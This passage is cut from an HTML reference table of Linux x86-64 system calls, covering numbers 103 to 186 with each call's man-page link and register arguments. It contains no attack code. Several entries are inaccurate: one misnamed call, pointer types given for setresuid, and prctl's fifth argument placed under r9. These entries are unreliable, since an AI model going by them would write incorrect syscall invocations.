data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">103</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/syslog" target="_blank">          sys_syslog        </a>      </td>      <td data-label="rdi">int type</td>      <td data-label="rsi">char* buf</td>      <td data-label="rdx">int len</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">104</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getgid" target="_blank">          sys_getgid        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">105</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setuid" target="_blank">          sys_setuid        </a>      </td>      <td data-label="rdi">uid_t uid</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">106</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setgid" target="_blank">          sys_setgid        </a>      </td>      <td data-label="rdi">gid_t gid</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">107</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/geteuid" target="_blank">          sys_geteuid        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">108</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getegid" target="_blank">          sys_getegid        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">109</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setpgid" target="_blank">          sys_setpgid        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">110</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getppid" target="_blank">          sys_getppid        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">111</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getpgrp" target="_blank">          sys_getpgrp        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">112</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setsid" target="_blank">          sys_setsid        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">113</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setreuid" target="_blank">          sys_setreuid        </a>      </td>      <td data-label="rdi">uid_t ruid</td>      <td data-label="rsi">uid_t euid</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">114</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setregid" target="_blank">          sys_setregid        </a>      </td>      <td data-label="rdi">gid_t rgid</td>      <td data-label="rsi">gid_t egid</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">115</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getgroups" target="_blank">          sys_getgroups        </a>      </td>      <td data-label="rdi">int gidsetsize</td>      <td data-label="rsi">gid_t* grouplist</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">116</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setgroups" target="_blank">          sys_setgroups        </a>      </td>      <td data-label="rdi">int gidsetsize</td>      <td data-label="rsi">gid_t* grouplist</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">117</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setresuid" target="_blank">          sys_setresuid        </a>      </td>      <td data-label="rdi">uid_t* ruid</td>      <td data-label="rsi">uid_t* euid</td>      <td data-label="rdx">uid_t* suid</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">118</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getresuid" target="_blank">          sys_getresuid        </a>      </td>      <td data-label="rdi">uid_t* ruid</td>      <td data-label="rsi">uid_t* euid</td>      <td data-label="rdx">uid_t *suid</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">119</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setresgid" target="_blank">          sys_setresgid        </a>      </td>      <td data-label="rdi">gid_t rgid</td>      <td data-label="rsi">gid_t egid</td>      <td data-label="rdx">gid_t sgid</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">120</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getresgid" target="_blank">          sys_getresgid        </a>      </td>      <td data-label="rdi">gid_t* rgid</td>      <td data-label="rsi">gid_t* egid</td>      <td data-label="rdx">gid_t* sgid</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">121</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getpgid" target="_blank">          sys_getpgid        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">122</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setfsuid" target="_blank">          sys_setfsuid        </a>      </td>      <td data-label="rdi">uid_t uid</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">123</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setfsgid" target="_blank">          sys_setfsgid        </a>      </td>      <td data-label="rdi">gid_t gid</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">124</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getsid" target="_blank">          sys_getsid        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">125</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/capget" target="_blank">          sys_capget        </a>      </td>      <td data-label="rdi">cap_user_header_t header</td>      <td data-label="rsi">cap_user_data_t dataptr</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">126</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/capset" target="_blank">          sys_capset        </a>      </td>      <td data-label="rdi">cap_user_header_t header</td>      <td data-label="rsi">const user_data_t data</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">127</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/rt_sigpending" target="_blank">          sys_rt_sigpending        </a>      </td>      <td data-label="rdi">sigset_t* set</td>      <td data-label="rsi">size_t sigsetsize</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">128</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/rt_sigtimedwait" target="_blank">          sys_sigtimedwait        </a>      </td>      <td data-label="rdi">const sigset_t* uthese</td>      <td data-label="rsi">siginfo_t* uinfo</td>      <td data-label="rdx">const struct timespec* utf</td>      <td data-label="r10">size_t sigsetsize</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">129</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/rt_sigqueueinfo" target="_blank">          sys_rt_sigqueueinfo        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">int sig</td>      <td data-label="rdx">siginfo_t* uinfo</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">130</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/rt_sigsuspend" target="_blank">          sys_rt_sigsuspend        </a>      </td>      <td data-label="rdi">sigset_t* unewset</td>      <td data-label="rsi">size_t sigsetsize</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">131</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sigaltstack" target="_blank">          sys_sigaltstack        </a>      </td>      <td data-label="rdi">const stack_t* uss</td>      <td data-label="rsi">stack_t* uoss</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">132</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/utime" target="_blank">          sys_utime        </a>      </td>      <td data-label="rdi">char* filename</td>      <td data-label="rsi">struct utimbuf* times</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">133</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mknod" target="_blank">          sys_mknod        </a>      </td>      <td data-label="rdi">const char* filename</td>      <td data-label="rsi">umode_t mode</td>      <td data-label="rdx">unsigned dev</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">134</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/uselib" target="_blank">          sys_uselib        </a>      </td>      <td data-label="rdi">const char* library</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">135</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/personality" target="_blank">          sys_personality        </a>      </td>      <td data-label="rdi">unsigned int personality</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">136</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/ustat" target="_blank">          sys_ustat        </a>      </td>      <td data-label="rdi">unsigned dev</td>      <td data-label="rsi">struct ustat* ubuf</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">137</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/statfs" target="_blank">          sys_statfs        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi">struct statfs* buf</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">138</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fstatfs" target="_blank">          sys_fstatfs        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">struct statfs* buf</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">139</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sysfs" target="_blank">          sys_sysfs        </a>      </td>      <td data-label="rdi">int option</td>      <td data-label="rsi">unsigned long arg1</td>      <td data-label="rdx">unsigned long arg2</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">140</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getpriority" target="_blank">          sys_getpriority        </a>      </td>      <td data-label="rdi">int which</td>      <td data-label="rsi">int who</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">141</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setpriority" target="_blank">          sys_setpriority        </a>      </td>      <td data-label="rdi">int which</td>      <td data-label="rsi">int who</td>      <td data-label="rdx">int niceval</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">142</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sched_setparam" target="_blank">          sys_sched_setparam        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">struct sched_param* param</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">143</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sched_getparam" target="_blank">          sys_sched_getparam        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">struct sched_param* param</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">144</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sched_setscheduler" target="_blank">          sys_sched_setscheduler        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">int policy</td>      <td data-label="rdx">struct sched_param* param</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">145</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sched_getscheduler" target="_blank">          sys_sched_getscheduler        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">146</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sched_get_priority_max" target="_blank">          sys_sched_get_priority_max        </a>      </td>      <td data-label="rdi">int policy</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">147</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sched_get_policy_min" target="_blank">          sys_sched_get_policy_min        </a>      </td>      <td data-label="rdi">int policy</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">148</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sched_rr_get_interval" target="_blank">          sys_sched_rr_get_interval        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">struct timespec* interval</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">149</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mlock" target="_blank">          sys_mlock        </a>      </td>      <td data-label="rdi">unsigned long start</td>      <td data-label="rsi">size_t len</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">150</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/munlock" target="_blank">          sys_munlock        </a>      </td>      <td data-label="rdi">unsigned long start</td>      <td data-label="rsi">size_t len</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">151</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mlockall" target="_blank">          sys_mlockall        </a>      </td>      <td data-label="rdi">int flags</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">152</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/munlockall" target="_blank">          sys_munlockall        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">153</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/vhangup" target="_blank">          sys_vhangup        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">154</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/modify_ldt" target="_blank">          sys_modify_ldt        </a>      </td>      <td data-label="rdi">int func</td>      <td data-label="rsi">void* ptr</td>      <td data-label="rdx">unsigned long bytecount</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">155</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/pivot_root" target="_blank">          sys_pivot_root        </a>      </td>      <td data-label="rdi">const char* new_root</td>      <td data-label="rsi">const char* put_old</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">156</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sysctl" target="_blank">          sys_sysctl        </a>      </td>      <td data-label="rdi">struct __sysctl_args* args</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">157</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/prctl" target="_blank">          sys_prctl        </a>      </td>      <td data-label="rdi">int option</td>      <td data-label="rsi">unsigned long arg2</td>      <td data-label="rdx">unsigned long arg3</td>      <td data-label="r10">unsigned long arg4</td>      <td data-label="r8"></td>      <td data-label="r9">unsigned long arg5</td>    </tr>    <tr>      <th scope="row" data-label="rax">158</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/arch_prctl" target="_blank">          sys_arch_prctl        </a>      </td>      <td data-label="rdi">struct task_struct* task</td>      <td data-label="rsi">int code</td>      <td data-label="rdx">unsigned long* addr</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">159</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/adjtimex" target="_blank">          sys_adjtimex        </a>      </td>      <td data-label="rdi">struct timex *txc_p</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">160</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setrlimit" target="_blank">          sys_setrlimit        </a>      </td>      <td data-label="rdi">unsigned int resource</td>      <td data-label="rsi">struct rlimit* rlim</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">161</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/chroot" target="_blank">          sys_chroot        </a>      </td>      <td data-label="rdi">const char* filename</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">162</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sync" target="_blank">          sys_sync        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">163</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/acct" target="_blank">          sys_acct        </a>      </td>      <td data-label="rdi">const char* name</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">164</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/settimeofday" target="_blank">          sys_settimeofday        </a>      </td>      <td data-label="rdi">struct timeval* tv</td>      <td data-label="rsi">struct timezone* tz</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">165</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mount" target="_blank">          sys_mount        </a>      </td>      <td data-label="rdi">char* dev_name</td>      <td data-label="rsi">char* dir_name</td>      <td data-label="rdx">char* type</td>      <td data-label="r10">unsigned long flags</td>      <td data-label="r8">void* data</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">166</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/umount2" target="_blank">          sys_umount2        </a>      </td>      <td data-label="rdi">const char* target</td>      <td data-label="rsi">int flags</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">167</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/swapon" target="_blank">          sys_swapon        </a>      </td>      <td data-label="rdi">const char* specialfile</td>      <td data-label="rsi">int swap_flags</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">168</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/swapoff" target="_blank">          sys_swapoff        </a>      </td>      <td data-label="rdi">const char* specialfile</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">169</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/reboot" target="_blank">          sys_reboot        </a>      </td>      <td data-label="rdi">int magic1</td>      <td data-label="rsi">int magic2</td>      <td data-label="rdx">unsigned int cmd</td>      <td data-label="r10">void* arg</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">170</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sethostname" target="_blank">          sys_sethostname        </a>      </td>      <td data-label="rdi">char* name</td>      <td data-label="rsi">int len</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">171</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setdomainname" target="_blank">          sys_setdomainname        </a>      </td>      <td data-label="rdi">char* name</td>      <td data-label="rsi">int len</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">172</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/iopl" target="_blank">          sys_iopl        </a>      </td>      <td data-label="rdi">unsigned int level</td>      <td data-label="rsi">struct pt_regs* regs</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">173</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/ioperm" target="_blank">          sys_ioperm        </a>      </td>      <td data-label="rdi">unsigned long from</td>      <td data-label="rsi">unsigned long num</td>      <td data-label="rdx">int turn_on</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">174</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/create_module" target="_blank">          sys_create_module        </a>      </td>      <td data-label="rdi"><strong>REMOVED IN Linux 2.6</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">175</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/init_module" target="_blank">          sys_init_module        </a>      </td>      <td data-label="rdi">void* umod</td>      <td data-label="rsi">unsigned long len</td>      <td data-label="rdx">const char* uargs</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">176</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/delete_module" target="_blank">          sys_delete_module        </a>      </td>      <td data-label="rdi">const char* name_user</td>      <td data-label="rsi">unsigned int flags</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">177</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/get_kernel_syms" target="_blank">          sys_get_kernel_syms        </a>      </td>      <td data-label="rdi"><strong>REMOVED IN Linux 2.6</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">178</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/query_module" target="_blank">          sys_query_module        </a>      </td>      <td data-label="rdi"><strong>REMOVED IN Linux 2.6</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">179</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/quotactl" target="_blank">          sys_quotactl        </a>      </td>      <td data-label="rdi">unsigned int cmd</td>      <td data-label="rsi">const char* special</td>      <td data-label="rdx">quid_t id</td>      <td data-label="r10">void* addr</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">180</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/nfsservctl" target="_blank">          sys_nfsservctl        </a>      </td>      <td data-label="rdi"><strong>REMOVED IN Linux 3.1</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">181</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getpmsg" target="_blank">          sys_getpmsg        </a>      </td>      <td data-label="rdi"><strong>UNIMPLEMENTED</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">182</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/putpmsg" target="_blank">          sys_putpmsg        </a>      </td>      <td data-label="rdi"><strong>UNIMPLEMENTED</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">183</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/afs_syscall" target="_blank">          sys_afs_syscall        </a>      </td>      <td data-label="rdi"><strong>UNIMPLEMENTED</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">184</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/tuxcall" target="_blank">          sys_tuxcall        </a>      </td>      <td data-label="rdi"><strong>UNIMPLEMENTED</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">185</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/security" target="_blank">          sys_security        </a>      </td>      <td data-label="rdi"><strong>UNIMPLEMENTED</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">186</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/gettid" target="_blank">          sys_gettid        </a>      </td>      <td 